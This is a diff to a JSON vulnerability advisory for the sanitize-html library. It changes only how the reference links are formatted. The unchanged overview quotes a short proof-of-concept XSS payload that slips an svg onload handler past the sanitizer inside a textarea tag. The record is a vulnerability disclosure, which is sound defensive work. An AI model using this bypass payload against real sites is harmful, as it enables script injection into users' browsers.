@@ -11,7 +11,10 @@
   "patched_versions": ">=1.11.4",
   "overview": "Sanitize-html is a library for scrubbing html input of malicious values.\n\nVersions 1.11.1 and below are vulnerable to cross site scripting (XSS) in certain scenarios:\n\nIf allowed at least one nonTextTags, the result is a potential XSS vulnerability.\nPoC:\n\n```\nvar sanitizeHtml = require('sanitize-html');\n\nvar dirty = '!<textarea>&lt;/textarea&gt;<svg/onload=prompt`xs`&gt;</textarea>!';\nvar clean = sanitizeHtml(dirty, {\n    allowedTags: [ 'textarea' ]\n});\n\nconsole.log(clean);\n\n// !<textarea></textarea><svg/onload=prompt`xs`></textarea>!\n```",
   "recommendation": "Upgrade to version 1.11.4 or later",
-  "references": "* https://github.com/punkave/sanitize-html/issues/100\n* https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403",
+  "references": [
+    "https://github.com/punkave/sanitize-html/issues/100",
+    "https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403"
+  ],
   "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
   "cvss_score": 5.4,
   "coordinating_vendor": "^Lift Security"
